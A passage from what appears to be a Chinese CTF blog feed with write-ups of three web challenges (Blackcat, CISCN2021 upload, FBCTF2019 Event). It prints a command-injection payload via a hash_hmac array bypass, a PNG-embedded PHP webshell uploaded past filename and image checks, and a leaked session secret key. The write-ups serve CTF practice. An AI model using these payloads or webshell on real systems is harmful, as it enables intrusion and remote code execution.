        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[hash_hmac|黑猫警长]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918211847862.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918211922839.png"></p><p>还以为提示会放在音频里。</p><p>结果听完了，真就黑猫警长？？</p><p>把mp3下载下来，里面放了源码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918212813013.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"clandestine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hh</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hh</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hash-hmac漏洞"><a href="#hash-hmac漏洞" class="headerlink" title="hash_hmac漏洞"></a>hash_hmac漏洞</h3><blockquote><p>hash_hmac($algo, $data, $key)</p></blockquote><p>当$data为数组，返回值是NULL</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Unknown_key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918213458176.png"></p><p>扫目录扫出flag.php，所以读取flag.php</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918235157150.png"></p><p>第一次hash_hmac的值是NULL，那第二次结果就可知了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hh</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">';cat flag.php'</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$hh</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">White-cat-monitor[]&#x3D;K1ose&amp;Black-Cat-Sheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear&#x3D;;cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/image-20210918235248329.png"></p><p>flag虽然打出来了，但提交到buu是错的，也不符合buu平时flag的格式。</p><p>搜了下原来得读取env。</p><pre class="line-numbers language-none"><code class="language-none">White-cat-monitor[]&#x3D;1&amp;Black-Cat-Sheriff&#x3D;afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;One-ear&#x3D;;env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2021 Quals]upload</title>
      <link href="/p/3974435572.html"/>
      <url>/p/3974435572.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[代码审计|图片马|imagecreatefrompng|imagecrop]</p><p>之前比赛做过来着，貌似当时没做出来。现在再试试，还是做不出来，无语了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这么大个的东西你是想d我吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"如果不能好好传图片的话就还是不要来打扰我了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"东西不能方方正正的话就很讨厌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"有些东西让你传上去的话那可不得了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"传都没有传上去"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>扫目录扫到example.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"要不咱们再看看？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"都不能解压呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"可以解压，我想想存哪里"</span><span class="token punctuation">;</span>    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mb-strtolower"><a href="#mb-strtolower" class="headerlink" title="mb_strtolower()"></a>mb_strtolower()</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915111256461.png"></p><p>需要<code>zip</code>字符，但前面又过滤了<code>i</code></p><p>利用unicode字符绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'İ'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为这里又有个url解码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144712527.png"></p><p>所以再加个url编码结果为<code>%C4%B0</code></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>可在发包数据中添加如下代码绕过，记得加0d0a换行符。</p><pre class="line-numbers language-none"><code class="language-none">#define width 1#define height 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="PNG-IDAT-Payload-Generator使用"><a href="#PNG-IDAT-Payload-Generator使用" class="headerlink" title="PNG-IDAT-Payload-Generator使用"></a>PNG-IDAT-Payload-Generator使用</h3><p>原始payload：</p><pre class="line-numbers language-none"><code class="language-none">text_payload &#x3D; b&quot;&lt;?&#x3D;$_GET[0]($_POST[1]);?&gt;&quot;payload &#x3D; b&quot;a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要进行修改，流程如下：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141018586.png"></p><pre class="line-numbers language-none"><code class="language-none">5b 3c 3f 3d 24 5f 47 45 54 5b 30 5d 28 24 5f 50 4f 53 54 5b 31 5d 29 3b 3f 3e 58 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>粘贴进010</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141756327.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141727306.png"></p><p>然后进行编辑,要求和之前长度一致</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142448122.png"></p><p>再转换一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142544741.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142844397.png"></p><p>生成下payload</p><pre class="line-numbers language-none"><code class="language-none">python generate.py -m php -o a.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915143245121.png"></p><p>将a.png改为a.php并压缩成zip</p><p>然后上传</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144814387.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144822309.png"></p><h3 id="上传改包问题"><a href="#上传改包问题" class="headerlink" title="上传改包问题"></a>上传改包问题</h3><p>试了很久，上传成功，但是下载下来zip包有错，经过测试发现一个问题，如果是burpsuite重传数据包或者中途截断再发送，都会导致zip包出错，猜测是burpsuite抓到包经过了编码，一些不可视的字符被转换过了，所以发包的时候数据已经被破坏了，所以尽量用winhex或010改好数据再上传</p><p>而且还得加好换行符<code>0d0a</code>，否则解压还会失败。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915224135552.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915223602985.png"></p><p>然后蚁剑连接/example/a.php，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[FBCTF2019]Event</title>
      <link href="/p/3098408404.html"/>
      <url>/p/3098408404.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目描述</p><blockquote><p>I heard cookies and string formatting are safe in 2019?</p><p><a href="http://challenges.fbctf.com:8083/">http://challenges.fbctf.com:8083</a></p><p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210914235156669.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>1@1登录</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210914235137547.png"></p><p>session解个码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210914234509346.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210914235120014.png"></p><p>看来得想办法找到key</p><p>在name和address试了半天，没想到event_important才是注入点</p><p>先试试<code>event_important=__dict__</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210914235708569.png"></p><p>tplmap跑了一圈没跑出来，可惜</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FBCTF2019-Event/image-20210915091750684.png"></p><p>key为</p><pre class="line-numbers language-none"><code class="language-none">fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造一下session，结束</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 玄武组]SSRFMe</title>
      <link href="/p/3756000955.html"/>
      <url>/p/3756000955.html</url>
      
